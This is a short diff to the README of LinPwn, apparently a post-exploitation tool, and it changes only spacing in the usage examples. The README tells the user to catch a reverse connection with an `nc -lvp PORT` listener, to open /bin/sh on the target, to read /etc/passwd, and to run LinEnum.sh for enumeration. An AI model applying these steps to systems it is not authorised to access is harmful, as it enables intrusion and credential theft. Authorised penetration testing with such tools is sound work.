@@ -10,10 +10,10 @@ Place the LinPwn binary on the target machine.<br>
 Run `nc -lvp PORT` on your machine and then run LinPwn on the target machine to get a connection.
 ## Usage
 1. shell - This command Executes /bin/sh<br>
-Example usage:`(LinPwn: Shell) > id`<br> 
+Example usage: `(LinPwn: Shell) > id`<br> 
 Type exit to return to LinPwn.<br>
 2. readfile - This command will print the contents of a file.<br>
-Example usage: `(LinPwn: ReadFile )> /etc/passwd`<br>
+Example usage: `(LinPwn: ReadFile)> /etc/passwd`<br>
 Type exit to return to LinPwn.<br>
 3. enumerate - this command runs LinEnum.sh
 Example usage:  `(LinPwn) > enumerate` 
